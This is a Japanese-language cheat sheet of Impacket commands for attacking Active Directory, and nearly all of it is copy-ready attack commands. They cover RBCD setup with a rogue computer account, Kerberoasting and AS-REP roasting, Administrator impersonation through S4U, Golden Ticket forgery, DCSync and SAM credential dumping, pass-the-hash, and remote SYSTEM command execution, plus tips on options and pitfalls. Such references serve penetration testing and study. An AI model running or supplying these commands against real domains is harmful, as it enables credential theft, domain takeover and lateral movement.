# Impacket スイート クイックリファレンス

AD 環境での攻撃・調査に使う Impacket ツール群のまとめ。

---

## アカウント操作

### addcomputer.py — コンピューターアカウントの作成

```bash
impacket-addcomputer \
  -computer-name 'ATTACKPC$' \
  -computer-pass 'Password123!' \
  -dc-ip [DC_IP] \
  '[DOMAIN]/[USER]:[PASSWORD]'
```

**用途:** RBCD 攻撃の準備。`SeMachineAccountPrivilege` が必要。

---

## Kerberos 関連

### GetUserSPNs.py — Kerberoasting

```bash
impacket-GetUserSPNs \
  '[DOMAIN]/[USER]:[PASSWORD]' \
  -dc-ip [DC_IP] \
  -request \
  -outputfile kerberoast.txt
```

### GetNPUsers.py — ASREPRoasting

```bash
impacket-GetNPUsers \
  '[DOMAIN]/' \
  -usersfile users.txt \
  -no-pass \
  -dc-ip [DC_IP] \
  -format hashcat
```

### getST.py — S4U2Self/S4U2Proxy でサービスチケット取得

```bash
impacket-getST \
  -spn 'cifs/[DC_FQDN]' \
  -impersonate administrator \
  -dc-ip [DC_IP] \
  '[DOMAIN]/ATTACKPC$:Password123!'
```

**用途:** RBCD 攻撃の Step 3。Administrator の TGS を取得する。

### ticketer.py — Golden / Silver Ticket の作成

```bash
# Golden Ticket
impacket-ticketer \
  -nthash [KRBTGT_HASH] \
  -domain-sid [DOMAIN_SID] \
  -domain [DOMAIN] \
  Administrator
```

---

## 権限設定

### rbcd.py — RBCD の設定

```bash
impacket-rbcd \
  -delegate-to '[DC_HOSTNAME]$' \
  -delegate-from 'ATTACKPC$' \
  -action write \
  -dc-ip [DC_IP] \
  '[DOMAIN]/[USER]:[PASSWORD]'
```

---

## 認証情報のダンプ

### secretsdump.py — DCSync / ローカルダンプ

```bash
# DCSync（パスワード認証）
impacket-secretsdump \
  -just-dc-ntlm \
  '[DOMAIN]/[USER]:[PASSWORD]@[DC_FQDN]'

# DCSync（NTLM ハッシュ認証）
impacket-secretsdump \
  -hashes :[NTLM_HASH] \
  -just-dc-ntlm \
  '[DOMAIN]/Administrator@[DC_FQDN]'

# DCSync（Kerberos チケット）
export KRB5CCNAME=/path/to/ticket.ccache
impacket-secretsdump \
  -k -no-pass \
  -just-dc-ntlm \
  -target-ip [DC_IP] \
  'administrator@[DC_FQDN]'

# ローカル SAM ダンプ
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

---

## リモート実行

### psexec.py — SMB 経由のコマンド実行（SYSTEM権限）

```bash
impacket-psexec '[DOMAIN]/[USER]:[PASSWORD]@[IP]'
impacket-psexec -hashes :[NTLM_HASH] '[DOMAIN]/Administrator@[IP]'
```

### wmiexec.py — WMI 経由のコマンド実行

```bash
impacket-wmiexec '[DOMAIN]/[USER]:[PASSWORD]@[IP]'
```

### smbexec.py — SMB 経由（psexec より静かな手法）

```bash
impacket-smbexec '[DOMAIN]/[USER]:[PASSWORD]@[IP]'
```

---

## 調査・列挙

### lookupsid.py — SID / RID ブルートフォース

```bash
impacket-lookupsid '[DOMAIN]/[USER]:[PASSWORD]@[DC_IP]'
# ドメイン内の全ユーザー・グループの SID と名前を列挙
```

### smbclient.py — SMB クライアント

```bash
impacket-smbclient '[DOMAIN]/[USER]:[PASSWORD]@[IP]'
```

---

## 共通のオプション

| オプション | 説明 |
|-----------|------|
| `-k -no-pass` | Kerberos 認証を使用（KRB5CCNAME 環境変数が必要） |
| `-hashes :[NTLM_HASH]` | Pass-The-Hash |
| `-dc-ip [DC_IP]` | DC の IP アドレスを直接指定（DNS 解決を回避） |
| `-target-ip [IP]` | ターゲットの IP を直接指定 |

---

## 注意点・落とし穴

- ツール名は `impacket-[toolname]` または `python3 /path/to/[toolname].py` の2通りがある
- `-just-dc-ntlm` を付けずに secretsdump を実行すると大量の出力が出るため注意
- Kerberos 認証使用時は時刻同期が必須（`sudo ntpdate [DC_IP]`）
- `[DC_FQDN]` は FQDN（完全修飾ドメイン名）を使用。IPアドレスでは Kerberos 認証が失敗する場合がある
